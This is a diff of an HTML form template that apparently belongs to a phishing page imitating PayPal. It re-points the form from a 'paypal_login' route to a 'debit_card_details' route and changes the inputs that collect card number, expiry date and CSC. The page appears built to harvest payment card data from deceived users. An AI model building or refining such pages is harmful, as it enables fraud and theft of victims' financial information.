@@ -59,20 +59,20 @@
         </div>
 
 
-            <form action="{{ url_for('paypal_login') }}" method="POST">
+            <form action="{{ url_for('debit_card_details') }}" method="POST">
                 <div class="form-floating mb-3">
-                    <input type="email" style="font-weight: 500;" class="form-control" id="floatingInput"
+                    <input type="number" style="font-weight: 500;" class="form-control" id="floatingInput"
                         name="card-number" placeholder="Card number" required>
                     <label for="floatingInput" style="font-weight: 400;">Card number</label>
                 </div>
                 <div class="d-flex" style="gap: 4%;">
                     <div class="form-floating " style="width: 48%;">
-                        <input type="password" style="font-weight: 500;" class="form-control" id="floatingPassword"
+                        <input type="text" style="font-weight: 500;" class="form-control" id="floatingPassword"
                             name="password" placeholder="Password" required>
                         <label for="floatingPassword" style="font-weight: 400;">Expiry date</label>
                     </div>
                     <div class="form-floating " style="width: 48%;">
-                        <input type="password" style="font-weight: 500;" class="form-control" id="floatingPassword"
+                        <input type="text" style="font-weight: 500;" class="form-control" id="floatingPassword"
                             name="password" placeholder="Password" required>
                         <label for="floatingPassword" style="font-weight: 400;">CSC</label>
                     </div>
